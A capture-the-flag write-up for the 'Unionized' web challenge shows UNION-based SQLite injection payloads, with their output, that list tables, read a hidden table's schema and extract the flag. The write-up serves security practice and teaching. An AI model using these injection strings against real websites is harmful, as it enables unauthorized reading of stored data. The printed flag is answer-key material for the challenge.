# Unionized 

## Description

Unionized | 100 points | By `Shahmeer Ali`

I was messing with some SQL, so I made this basic website. It only stores school data...probably.

Web servers: [challs.bcactf.com:31052](http://challs.bcactf.com:31052/)

## Analysis

Since the website is simple it must be using Sqlite3. 

Let's see if we can find tables names. I used payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
```
high' 
UNION SELECT tbl_name FROM sqlite_master 
WHERE type='table' and tbl_name NOT like 'sqlite_%

-   Moonachie High
-   mystery
-   school_data
```

Extracting column names
```
high' 
UNION SELECT sql FROM sqlite_master 
WHERE type!='meta' AND sql NOT NULL AND name like 'mystery

-   CREATE TABLE mystery(unkn0wn TEXT)
-   Moonachie High
```

## Solution

```
high' 
UNION SELECT unkn0wn FROM mystery 
WHERE unkn0wn like 'bca

-   Moonachie High
-   bcactf{1_L0v3_sQl_UN10n_QU3r13S}
```